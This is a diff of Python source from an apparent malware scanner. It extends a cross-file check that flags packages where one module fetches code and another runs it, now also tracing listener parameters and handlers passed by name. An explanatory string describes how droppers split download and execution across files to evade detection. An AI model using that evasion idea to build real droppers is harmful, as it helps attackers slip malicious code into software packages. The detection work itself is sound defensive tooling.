+            res = _received_code_kind(code, extra_always=sorted(seeds)[:_XF_MAX_SEEDS], extra_runners=["_xfe"])
+            if res is None or res[1] != "run":
+                continue
+            for lkey, m in heard:
+                param = m.group("fp") or m.group("ap") or m.group("bp")
+                handler = m.group("handler")
+                line = pkg.mods[lkey].text.count("\n", 0, m.start()) + 1
+                names, rows, first = out.setdefault(lkey, ({}, [], line))
+                if param is not None:
+                    names[param] = key
+                elif handler is not None:
+                    names["_xfr"] = key
+                    rows.append(f"{handler}(_xfr)")
+                out[lkey] = (names, rows, min(first, line))
+    return out
+
+
 _XF_WHY = (
     "A dropper can split what it downloads and the code that runs it across two files of a "
     "package, so neither file shows the shape alone: one fetches, the other runs what the "
@@ -12064,20 +12545,22 @@ def _xf_package_issues(mods, skip, who):
     pkg = _XfPackage(mods)
     tainted = pkg.tainted()
     runners = pkg.runners()
-    if not tainted and not runners:
-        return []
     envs = {}
     for key, name in sorted(tainted):
         if name.startswith("<env>."):
             envs.setdefault(name[len("<env>."):], key)
     held, running = _xf_marked_members(pkg, tainted), _xf_marked_members(pkg, runners)
+    heard = _xf_emitter_seeds(pkg, tainted, envs, held)
+    if not tainted and not runners and not heard:
+        return []
     out = []
     for mod in mods.values():
         if mod.path.replace(os.sep, "/") in skip:
             continue
         seeds, direct = _xf_seeds(pkg, mod, tainted, envs, held) if tainted else ({}, [])
         run_seeds = _xf_seeds(pkg, mod, runners, {}, running)[0] if runners else {}
-        if not seeds and not direct and not run_seeds:
+        given, rows, first = heard.get(mod.key, ({}, [], 0))
+        if not seeds and not direct and not run_seeds and not given:
             continue
         code = _import_code(mod.text, mod.lang)
         if _received_code_kind(code) is not None:
@@ -12090,6 +12573,16 @@ def _xf_package_issues(mods, skip, who):
         if res is not None:
             out.append(_xf_issue(mod.path, res[0], mod.text, res[1], sorted({seeds[n] for n in names}), who_))
             continue
+        if given:
+            # the listeners' parameters seeded; a handler given by name called after the file
+            end = code.count("\n") + 1
+            both = dict(seeds, **given)
+            names = sorted(both)[:_XF_MAX_SEEDS]
+            res = _received_code_kind(code + "".join("\n" + r for r in rows), extra_always=names)
+            if res is not None:
+                out.append(_xf_issue(mod.path, first if res[0] > end else res[0], mod.text, res[1],
+                                     sorted({both[n] for n in names}), who_))
+                continue
         if run_seeds:
             run_names = sorted(run_seeds)[:_XF_MAX_SEEDS]
             res = _received_code_kind(code, extra_always=names, extra_runners=run_names)
